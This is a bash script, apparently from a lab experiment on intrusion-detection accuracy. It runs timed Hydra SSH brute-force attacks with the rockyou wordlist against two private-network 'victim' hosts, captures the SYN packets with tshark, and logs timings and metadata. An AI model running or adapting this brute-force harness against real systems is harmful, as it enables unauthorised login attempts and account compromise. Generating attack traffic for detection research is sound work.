#!/usr/bin/env bash
set -euo pipefail

### ===== CONFIG AREA =====
VICTIM1="192.168.67.12"
VICTIM2="192.168.67.13"
ATTACKER_IP="192.168.67.67"
OUTBASE="/home/pros/test_results/accuracy/silent"
RUN_DURATION=600
HYDRA_USER="victim"
HYDRA_WORDLIST="/home/pros/rockyou.txt"
HYDRA_THREADS=2
CHRONYC_BIN="$(command -v chronyc || true)"
### =========================

mkdir -p "$OUTBASE"

ATTACKS_CSV="$OUTBASE/attacks_log.csv"
if [ ! -f "$ATTACKS_CSV" ]; then
  echo "attack_id,attacker_ip,target1,target2,duration_s,threads,start_epoch,end_epoch,notes" > "$ATTACKS_CSV"
fi

PREFIX="accuracy_silent"
i=1
while [ -d "$OUTBASE/${PREFIX}_${i}" ]; do
  i=$((i+1))
done
ATTACK_ID="${PREFIX}_${i}"
RUNDIR="$OUTBASE/$ATTACK_ID"
mkdir -p "$RUNDIR"

echo "[INFO] Attack run id: $ATTACK_ID"
echo "[INFO] Output dir: $RUNDIR"

# Time sync if possible
if [ -n "$CHRONYC_BIN" ]; then
  echo "[TIME] chrony makestep..."
  $CHRONYC_BIN tracking >/dev/null 2>&1 || true
  $CHRONYC_BIN makestep >/dev/null 2>&1 || true
fi

START_EPOCH="$(printf "%.6f" "$(date -u +%s.%N)")"

### ========= NEW: START TSHA RK CAPTURE =========
TSHARK_JSON="$RUNDIR/attack_start_epoch.json"
TSHARK_CSV="$RUNDIR/attack_start_epoch.csv"

echo "[CAPTURE] Starting tshark capture..."
sudo tshark -i any \
  -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.port == 22" \
  -T json \
  > "$TSHARK_JSON" 2>/dev/null &

TSHARK_PID=$!

# Secondary CSV output
sudo tshark -i any \
  -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.port == 22" \
  -T fields -e frame.time_epoch -e ip.src \
  -E header=y -E separator=, \
  > "$TSHARK_CSV" 2>/dev/null &

TSHARK_PID2=$!

echo "[CAPTURE] tshark PIDs: $TSHARK_PID , $TSHARK_PID2"
### ===============================================

# Write metadata
{
  echo "attack_id,${ATTACK_ID}"
  echo "attacker_ip,${ATTACKER_IP}"
  echo "target1,${VICTIM1}"
  echo "target2,${VICTIM2}"
  echo "duration_s,${RUN_DURATION}"
  echo "threads,${HYDRA_THREADS}"
  echo "start_epoch,${START_EPOCH}"
} > "$RUNDIR/metadata.txt"

HYDRA_OUT1="$RUNDIR/hydra_t1.txt"
HYDRA_OUT2="$RUNDIR/hydra_t2.txt"

echo "[ATTACK] Starting Hydra on victims..."
timeout "${RUN_DURATION}s" hydra -l "$HYDRA_USER" -P "$HYDRA_WORDLIST" -t "$HYDRA_THREADS" ssh://"${VICTIM1}" > "$HYDRA_OUT1" 2>&1 &
PID1=$!
timeout "${RUN_DURATION}s" hydra -l "$HYDRA_USER" -P "$HYDRA_WORDLIST" -t "$HYDRA_THREADS" ssh://"${VICTIM2}" > "$HYDRA_OUT2" 2>&1 &
PID2=$!

wait $PID1 2>/dev/null || true
wait $PID2 2>/dev/null || true

END_EPOCH="$(printf "%.6f" "$(date -u +%s.%N)")"
echo "end_epoch,${END_EPOCH}" >> "$RUNDIR/metadata.txt"

sleep 2

### ====== STOP TSHARK ======
echo "[CAPTURE] Stopping tshark..."
sudo kill $TSHARK_PID 2>/dev/null || true
sudo kill $TSHARK_PID2 2>/dev/null || true
sleep 1
### ===========================

# Summary
echo "attack_id,${ATTACK_ID}" > "$RUNDIR/summary.txt"
echo "attacker_ip,${ATTACKER_IP}" >> "$RUNDIR/summary.txt"
echo "target1,${VICTIM1}" >> "$RUNDIR/summary.txt"
echo "target2,${VICTIM2}" >> "$RUNDIR/summary.txt"
echo "start_epoch,${START_EPOCH}" >> "$RUNDIR/summary.txt"
echo "end_epoch,${END_EPOCH}" >> "$RUNDIR/summary.txt"

echo "${ATTACK_ID},${ATTACKER_IP},${VICTIM1},${VICTIM2},${RUN_DURATION},${HYDRA_THREADS},${START_EPOCH},${END_EPOCH},\"qos-stress-capture\"" >> "$ATTACKS_CSV"

echo "[DONE] Run completed"
echo "[DONE] Attack start epochs captured:"
echo "  - JSON: $TSHARK_JSON"
echo "  - CSV:  $TSHARK_CSV"

echo "---- summary ----"
cat "$RUNDIR/summary.txt"